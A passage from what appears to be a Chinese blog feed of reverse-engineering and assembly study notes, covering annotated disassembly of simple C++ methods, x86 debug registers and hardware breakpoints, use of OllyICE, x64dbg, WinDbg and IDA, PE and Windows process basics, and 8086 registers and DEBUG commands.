ss:[ebp-0x14]</span><br><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11595    C745 FC 0000000&gt;mov     dword ptr ss:[ebp-0x4],0x0</span><br><span class=\"line\">00D1159C    6A 01           push    0x1</span><br><span class=\"line\">00D1159E    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115A6    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D115AE    8945 E0         mov     dword ptr ss:[ebp-0x20],eax</span><br><span class=\"line\">00D115B1    8BF4            mov     esi,esp</span><br><span class=\"line\">00D115B3    FF15 C492D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.getchar&gt;; msvcr90d.getchar</span><br><span class=\"line\">00D115B9    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D115BB    E8 8AFBFFFF     call    00D1114A</span><br><span class=\"line\">00D115C0    C785 14FFFFFF 0&gt;mov     dword ptr ss:[ebp-0xEC],0x0</span><br><span class=\"line\">00D115CA    C745 FC FFFFFFF&gt;mov     dword ptr ss:[ebp-0x4],-0x1</span><br><span class=\"line\">00D115D1    8D4D EC         lea     ecx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">00D115D4    E8 4FFAFFFF     call    00D11028</span><br><span class=\"line\">00D115D9    8B85 14FFFFFF   mov     eax,dword ptr ss:[ebp-0xEC]</span><br><span class=\"line\">00D115DF    52              push    edx</span><br><span class=\"line\">00D115E0    8BCD            mov     ecx,ebp</span><br><span class=\"line\">00D115E2    50              push    eax</span><br><span class=\"line\">00D115E3    8D15 1016D100   lea     edx,dword ptr ds:[0xD11610]</span><br><span class=\"line\">00D115E9    E8 A3FAFFFF     call    00D11091</span><br><span class=\"line\">00D115EE    58              pop     eax</span><br><span class=\"line\">00D115EF    5A              pop     edx</span><br><span class=\"line\">00D115F0    8B4D F4         mov     ecx,dword ptr ss:[ebp-0xC]</span><br><span class=\"line\">00D115F3    64:890D 0000000&gt;mov     dword ptr fs:[0],ecx</span><br><span class=\"line\">00D115FA    59              pop     ecx</span><br><span class=\"line\">00D115FB    5F              pop     edi</span><br><span class=\"line\">00D115FC    5E              pop     esi</span><br><span class=\"line\">00D115FD    5B              pop     ebx</span><br><span class=\"line\">00D115FE    81C4 F0000000   add     esp,0xF0</span><br><span class=\"line\">00D11604    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11606    E8 3FFBFFFF     call    00D1114A</span><br><span class=\"line\">00D1160B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1160D    5D              pop     ebp</span><br><span class=\"line\">00D1160E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D11590    E8 D3FBFFFF     call    00D11168</span><br><span class=\"line\">//00D11168   /E9 73020000     jmp     MyTest::MyTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D113E0 &gt;  55              push    ebp</span><br><span class=\"line\">00D113E1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D113E3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D113E9    53              push    ebx</span><br><span class=\"line\">00D113EA    56              push    esi</span><br><span class=\"line\">00D113EB    57              push    edi</span><br><span class=\"line\">00D113EC    51              push    ecx</span><br><span class=\"line\">00D113ED    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D113F3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D113F8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D113FD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D113FF    59              pop     ecx</span><br><span class=\"line\">00D11400    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11403    8BF4            mov     esi,esp</span><br><span class=\"line\">00D11405    68 3C67D100     push    00D1673C                                 ; ASCII &quot;1111\\n&quot;</span><br><span class=\"line\">00D1140A    FF15 CC92D100   call    dword ptr ds:[&lt;&amp;MSVCR90D.printf&gt;]        ; msvcr90d.printf</span><br><span class=\"line\">00D11410    83C4 04         add     esp,0x4</span><br><span class=\"line\">00D11413    3BF4            cmp     esi,esp</span><br><span class=\"line\">00D11415    E8 30FDFFFF     call    00D1114A</span><br><span class=\"line\">00D1141A    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D1141D    5F              pop     edi</span><br><span class=\"line\">00D1141E    5E              pop     esi</span><br><span class=\"line\">00D1141F    5B              pop     ebx</span><br><span class=\"line\">00D11420    81C4 CC000000   add     esp,0xCC</span><br><span class=\"line\">00D11426    3BEC            cmp     ebp,esp</span><br><span class=\"line\">00D11428    E8 1DFDFFFF     call    00D1114A</span><br><span class=\"line\">00D1142D    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1142F    5D              pop     ebp</span><br><span class=\"line\">00D11430    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A1    E8 CCFBFFFF     call    00D11172</span><br><span class=\"line\">00D11172   /E9 49030000     jmp     MyTest::SetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D114C0 &gt;  55              push    ebp</span><br><span class=\"line\">00D114C1    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D114C3    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D114C9    53              push    ebx</span><br><span class=\"line\">00D114CA    56              push    esi</span><br><span class=\"line\">00D114CB    57              push    edi</span><br><span class=\"line\">00D114CC    51              push    ecx</span><br><span class=\"line\">00D114CD    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D114D3    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D114D8    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D114DD    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D114DF    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\">//以下四句为\tTest.SetTest(1);的关键代码</span><br><span class=\"line\">00D114E0    894D F8         mov     dword ptr ss:[ebp-0x8],ecx    ;ecx此时为this, i = this </span><br><span class=\"line\">00D114E3    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]\t  ;ebp-8是this, eax=this</span><br><span class=\"line\">00D114E6    8B4D 08         mov     ecx,dword ptr ss:[ebp+0x8]    ;ecx = 1 ,ebp+8是从外面传来的1</span><br><span class=\"line\">00D114E9    8908            mov     dword ptr ds:[eax],ecx        ;this-&gt;m = 1</span><br><span class=\"line\">//</span><br><span class=\"line\"></span><br><span class=\"line\">00D114EB    5F              pop     edi</span><br><span class=\"line\">00D114EC    5E              pop     esi</span><br><span class=\"line\">00D114ED    5B              pop     ebx</span><br><span class=\"line\">00D114EE    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D114F0    5D              pop     ebp</span><br><span class=\"line\">00D114F1    C2 0400         retn    0x4</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00D115A9    E8 3CFCFFFF     call    00D111EA</span><br><span class=\"line\">00D111EA   /E9 21030000     jmp     MyTest::GetTest</span><br><span class=\"line\"></span><br><span class=\"line\">00D11510 &gt;  55              push    ebp</span><br><span class=\"line\">00D11511    8BEC            mov     ebp,esp</span><br><span class=\"line\">00D11513    81EC CC000000   sub     esp,0xCC</span><br><span class=\"line\">00D11519    53              push    ebx</span><br><span class=\"line\">00D1151A    56              push    esi</span><br><span class=\"line\">00D1151B    57              push    edi</span><br><span class=\"line\">00D1151C    51              push    ecx</span><br><span class=\"line\">00D1151D    8DBD 34FFFFFF   lea     edi,dword ptr ss:[ebp-0xCC]</span><br><span class=\"line\">00D11523    B9 33000000     mov     ecx,0x33</span><br><span class=\"line\">00D11528    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00D1152D    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00D1152F    59              pop     ecx</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">//以下三句为int Number = Test.GetTest();的关键代码</span><br><span class=\"line\">00D11530    894D F8         mov     dword ptr ss:[ebp-0x8],ecx</span><br><span class=\"line\">00D11533    8B45 F8         mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00D11536    8B00            mov     eax,dword ptr ds:[eax]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00D11538    5F              pop     edi</span><br><span class=\"line\">00D11539    5E              pop     esi</span><br><span class=\"line\">00D1153A    5B              pop     ebx</span><br><span class=\"line\">00D1153B    8BE5            mov     esp,ebp</span><br><span class=\"line\">00D1153D    5D              pop     ebp</span><br><span class=\"line\">00D1153E    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"动态调试基础\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础\">#</a> 动态调试基础</h2>\n<h3 id=\"断点\"><a class=\"markdownIt-Anchor\" href=\"#断点\">#</a> 断点</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DR0~DR3这四个寄存器是断点地址存储器,用于保存断点的地址</span><br><span class=\"line\">DR6是调试状态寄存器用于指明DR0~DR3寄存器中哪一个产生了调试异常</span><br><span class=\"line\">DR6寄存器使用比特位B0~B3来指明DR0~DR3中哪个产生了调试异常</span><br><span class=\"line\">DR7是断点属性控制器</span><br><span class=\"line\">DR7寄存器分别保存着DR0~DR3的断点地址对应的断点的属性,属性有如下几种:</span><br><span class=\"line\">L0~L3:这个比特位等于1,则断点为本地断点.</span><br><span class=\"line\">G0~G3:这个比特位等于1,则断点为全局断点.</span><br><span class=\"line\">R/W0-R/W3:</span><br><span class=\"line\">00：执行断点</span><br><span class=\"line\">01：数据写入断点</span><br><span class=\"line\">10：I/0读写断点</span><br><span class=\"line\">11：读写断点()读取指令不算)</span><br></pre></td></tr></table></figure>\n<p>DR0-DR3 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191812086-b457e0fc-6a04-403f-a7f4-848fd2617c6e.png\" alt=\"img\"></p>\n<p>删除硬件断点 调试 -&gt; 硬件断点</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655191872090-b8599c55-b435-459d-9cbc-ec378d651497.png\" alt=\"img\"></p>\n<p>设置硬件断点  右键 -&gt; 断点 -&gt; 硬件执行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112211213663.png\" alt=\"image-20221112211213663\"></p>\n<p>取消硬件断点：  hd 基址</p>\n<p>对当前地址做中断，即添加硬件断点： hr 基址</p>\n<p>常用断点：软件断点，内存写入，内存访问，硬件执行</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192756712-0636b463-746a-4c86-8b38-44b2bb9597c5.png\" alt=\"img\"></p>\n<p>ALT+M 内存镜像</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655192833816-1b08c4ac-e51c-419e-906d-f288dd1d9a22.png\" alt=\"img\"></p>\n<h3 id=\"常用调试器\"><a class=\"markdownIt-Anchor\" href=\"#常用调试器\">#</a> 常用调试器</h3>\n<h4 id=\"ollyice\"><a class=\"markdownIt-Anchor\" href=\"#ollyice\">#</a> OllyICE</h4>\n<p>查看在内存在对应的字节码，即指令在内存中的机器码</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194426316-532565d9-fa78-44e2-b792-c1d4f47c3c65.png\" alt=\"img\"></p>\n<p>一般来说程序映射到内存中基址从 0040 开始，即 PE 文件头</p>\n<p>映射到代码段需要 + 1000，前 1000 是 PE 头信息</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1655194544858-688f3db0-11f9-4a14-b509-46464ef0c7e3.png\" alt=\"img\"></p>\n<p>8087 中浮点运行，反调试会用到</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214201466.png\" alt=\"image-20221112214201466\"></p>\n<p>用于轴坐标，准心，多用于游戏分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214252305.png\" alt=\"image-20221112214252305\"></p>\n<h4 id=\"xdbg\"><a class=\"markdownIt-Anchor\" href=\"#xdbg\">#</a> xdbg</h4>\n<p>1. 线程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221112214836603.png\" alt=\"image-20221112214836603\"></p>\n<p>stdcall 一般在函数内部做 ret 做堆栈平衡</p>\n<p>windbg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:004&gt; g</span><br><span class=\"line\">(a5c.9dc): Break instruction exception - code 80000003 (first chance)</span><br><span class=\"line\">eax=7efda000 ebx=00000000 ecx=00000000 edx=77a4f7ea esi=00000000 edi=00000000</span><br><span class=\"line\">eip=779c000c esp=02adff5c ebp=02adff88 iopl=0         nv up ei pl zr na pe nc</span><br><span class=\"line\">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246</span><br><span class=\"line\">ntdll!DbgBreakPoint:</span><br><span class=\"line\">779c000c cc              int     3</span><br><span class=\"line\">0:004&gt; bp kernel32!OpenProcess</span><br><span class=\"line\">0:004&gt; u kernel32!OpenProcess</span><br><span class=\"line\">kernel32!OpenProcess:</span><br><span class=\"line\">76831986 8bff            mov     edi,edi</span><br><span class=\"line\">76831988 55              push    ebp</span><br><span class=\"line\">76831989 8bec            mov     ebp,esp</span><br><span class=\"line\">7683198b 5d              pop     ebp</span><br><span class=\"line\">7683198c eb05            jmp     kernel32!OpenProcess+0xd (76831993)</span><br><span class=\"line\">7683198e 90              nop</span><br><span class=\"line\">7683198f 90              nop</span><br><span class=\"line\">76831990 90              nop</span><br><span class=\"line\">0:004&gt; u 76831993</span><br><span class=\"line\">kernel32!OpenProcess+0xd:</span><br><span class=\"line\">76831993 ff2554098376    jmp     dword ptr [kernel32+0x10954 (76830954)]</span><br><span class=\"line\">76831999 90              nop</span><br><span class=\"line\">7683199a 90              nop</span><br><span class=\"line\">7683199b 90              nop</span><br><span class=\"line\">7683199c 90              nop</span><br><span class=\"line\">7683199d 90              nop</span><br><span class=\"line\">kernel32!WaitForMultipleObjectsEx:</span><br><span class=\"line\">7683199e 8bff            mov     edi,edi</span><br><span class=\"line\">768319a0 55              push    ebp</span><br></pre></td></tr></table></figure>\n<p>VT</p>\n<p>需要开启</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221113204110511.png\" alt=\"image-20221113204110511\"></p>\n<h2 id=\"动态调试基础二\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础二\">#</a> 动态调试基础二</h2>\n<p>ALT+F9  返回调用本函数的函数的代码</p>\n<p>rpb radmin.rpb 存在 127.0.0.1 的配置信息</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116181239485.png\" alt=\"image-20221116181239485\" style=\"zoom:67%;\" />\n<h3 id=\"硬件断点\"><a class=\"markdownIt-Anchor\" href=\"#硬件断点\">#</a> 硬件断点</h3>\n<ol>\n<li>Intel 80306 以上的 CPU 给我们提供了调试寄存器用于软件调试，硬件断点是通过设置调试寄存器实现的。</li>\n</ol>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116183140142.png\" alt=\"image-20221116183140142\"></p>\n<p>调试时线程挂起</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116183413279.png\" alt=\"image-20221116183413279\"></p>\n<p>右键 resume all 激活</p>\n<p>实现硬件断点，首先要获取当前线程环境</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//获取线程环境</span></span><br><span class=\"line\">CONTEXT g_Context = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">g_Context.ContextFlags = CONTEXT_CONTROL;</span><br><span class=\"line\"><span class=\"built_in\">GetThreadContext</span>(hThread, &amp;g_Context);</span><br></pre></td></tr></table></figure>\n<p>在 CONTEXT 结构体中，存放了诸多当前线程环境的信息</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221116184014697.png\" alt=\"image-20221116184014697\" style=\"zoom:67%;\" />\n<h2 id=\"ida动态分析基础\"><a class=\"markdownIt-Anchor\" href=\"#ida动态分析基础\">#</a> IDA 动态分析基础</h2>\n<p>导入表：编译时倒入，通过静态链接到输入表</p>\n<p>1.debug -&gt; local 32 debug</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221117210719141.png\" alt=\"image-20221117210719141\"></p>\n<p>IDA 远程调试</p>\n<p>将 dbgsrv 放到要调试的文件夹中</p>\n<h2 id=\"pe文件结构\"><a class=\"markdownIt-Anchor\" href=\"#pe文件结构\">#</a> PE 文件结构</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221119190434856.png\" alt=\"image-20221119190434856\"></p>\n<h2 id=\"windows系统安全基础\"><a class=\"markdownIt-Anchor\" href=\"#windows系统安全基础\">#</a> Windows 系统安全基础</h2>\n<p>进程句柄表</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/563d88364cb24f768722413a352523a4.png\" alt=\"img\"></p>\n<p>当你输入用户名和口令时，Winlogon 将其发送给一个叫做 LSASS 的子进程。如果你执行对服务器或工作站的本地登录，LSASS 进程将在安全数据库（亦即 SAM）中查对有关用户名和口令。Winlogon 有两个子进程，即服务控制器和 LSASS。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120184811911.png\" alt=\"image-20221120184811911\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120184825383.png\" alt=\"image-20221120184825383\"></p>\n<p>Explorer 进程 在 Windows 系列的操作系统中，运行时都会启动一个名为 Explorer.exe 的进程。这个进程主要负责显示系统桌面上的图标以及任务栏。</p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2022/11/01/%E6%B1%87%E7%BC%96/",
            "url": "http://example.com/2022/11/01/%E6%B1%87%E7%BC%96/",
            "title": "汇编",
            "date_published": "2022-11-01T05:38:45.000Z",
            "content_html": "<h1 id=\"汇编\"><a class=\"markdownIt-Anchor\" href=\"#汇编\">#</a> 汇编</h1>\n<p>1. 汇编语言组成</p>\n<p>汇编指令 ，伪指令，其他符号</p>\n<p>2. 汇编不区分大小写</p>\n<p>3. 数据总线，控制总线，地址总线 – 外部总线</p>\n<h2 id=\"寄存器cpu\"><a class=\"markdownIt-Anchor\" href=\"#寄存器cpu\">#</a> 寄存器（CPU）</h2>\n<p>CPU 由运算器，控制器，寄存器组成，靠内部总线相连</p>\n<p>8086 有 14 个寄存器，它们的名称为 AB,BX,CX,DX，SI，DI，SP，BP，IP，CS，SS，DS，ES，PSW，都是 16 位</p>\n<p>AX,BX,CX,DX 为通用结存器，最大可以存储 2^16-1</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009203327558.png\" alt=\"image-20221009203327558\" style=\"zoom:50%;\" />\n<p>每个又可以分为 H 和 L，比如 AH 和 AL，可以分开独立使用</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009204003372.png\" alt=\"image-20221009204003372\" style=\"zoom:50%;\" />\n<p>1word = 2 Byte</p>\n<p>16 位 CPU 特征：1. 运算器一次最多处理 16 位 2，寄存器最大宽度为 16 位 3. 寄存器和运算器之间通路 16 位</p>\n<p>由于 cpu 内部总线是 16 位，但外部总线是 20 位</p>\n<p>8086 内部使用两个 16 位内部地址来将器变为 20 位</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009211023097.png\" alt=\"image-20221009211023097\" style=\"zoom:50%;\" />\n<p>第一个地址为段地址，第二个为偏移地址 ，通过地址加法器变为 20 位</p>\n<p>物理地址 = 段地址 * 16 + 偏移地址</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221009211420365.png\" alt=\"image-20221009211420365\" style=\"zoom:50%;\" />\n<p>即地址左移四位，每次左移一位，对应的 16 进制和 10 进制就 * 2，因为地址是二进制</p>\n<p>扩展：一个 x 进制左移一位就 * x</p>\n<p>段地址长度可以自己指定，一个段的最大长度为 64kb，起始地址一定为 16 的倍数</p>\n<p>一个物理地址可以有很多种段地址和偏移地址的组合</p>\n<p>2000:1F60 数据在 21F60 中</p>\n<p>段寄存器 CS，DS，SS，ES</p>\n<p>CS：代码地址</p>\n<p>DS：数据地址</p>\n<p>SS：堆栈地址</p>\n<p>IP：指令指针寄存器</p>\n<p>修改 CS IP 中内容使用</p>\n<p>jmp 段地址：偏移地址</p>\n<p>jmp ax   // 仅修改 IP 内容，参数为合法寄存器，类似于 mov IP，AX</p>\n<p>8086cpu 工作过程</p>\n<p>1.CS:IP 指向内存单元读取执行，读取执行进入指令缓冲器</p>\n<p>2.IP 指向下一条指令</p>\n<p>3. 执行指令，重复到 1</p>\n<p>初始 CS=2000H，IP=0000H</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010210638345.png\" alt=\"image-20221010210638345\" style=\"zoom:50%;\" />\n<p>mov ax 6622</p>\n<p>jmp 1000:3</p>\n<p>mov ax,0000</p>\n<p>mov bx,ax</p>\n<p>jmp bx</p>\n<p>mov ax,0123</p>\n<p>mov ax,0000</p>\n<p>… 死循环</p>\n<p>代码段</p>\n<p>将 &lt;=64kb 的一组代码，起始地址为 16 倍数的内存单元作为一个代码段</p>\n<p>通过 CS：IP 指向代码段首地址来执行代码段</p>\n<p>DEBUG</p>\n<p>用 Debug 的 R 命令查看、改变 CPU 寄存器的内容；</p>\n<p>用 Debug 的 D 命令查看内存中的内容；</p>\n<p>用 Debug 的 E 命令改写内存中的内容；</p>\n<p>用 Debug 的 U 命令将内存中的机器指令翻译成汇编指令；</p>\n<p>用 Debug 的 T 命令执行一条机器指令；</p>\n<p>用 Debug 的 A 命令以汇编指令的格式在内存中写入一条机器指令。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213213522.png\" alt=\"image-20221010213213522\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213504618.png\" alt=\"image-20221010213504618\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213716733.png\" alt=\"image-20221010213716733\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010213841925.png\" alt=\"image-20221010213841925\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221010214052414.png\" alt=\"image-20221010214052414\"></p>\n<p>fff0:0 ff 可以查看 rom 时间</p>\n<p>b810:0 可以修改显存</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011204621998.png\" alt=\"image-20221011204621998\" style=\"zoom:50%;\" />\n<p>1 地址字单元存放的字型数据时 124EH</p>\n<p>可以将 N 和 N+1 两个单元看成一个字单元</p>\n<h2 id=\"寄存器内存\"><a class=\"markdownIt-Anchor\" href=\"#寄存器内存\">#</a> 寄存器（内存）</h2>\n<p>MOV al,[0]  // 将偏移地址为 0 的内存单元送到 AL 寄存器中</p>\n<p>不能把立即数直接送入段寄存器 ，需要经过通用寄存器中转</p>\n<p>数据 -》通用寄存器 -》段寄存器</p>\n<p>将数据从寄存器送入内存单元</p>\n<p>mov bx,1000H</p>\n<p>mov ds,bx</p>\n<p>mov [0],al</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011210109223.png\" alt=\"image-20221011210109223\" style=\"zoom:50%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221011210150336.png\" alt=\"image-20221011210150336\" style=\"zoom:50%;\" />\n<p>-e 1000:0 23 11 22 66</p>\n<p>1122 8833 8833</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221012084245812.png\" alt=\"image-20221012084245812\" style=\"zoom:50%;\" 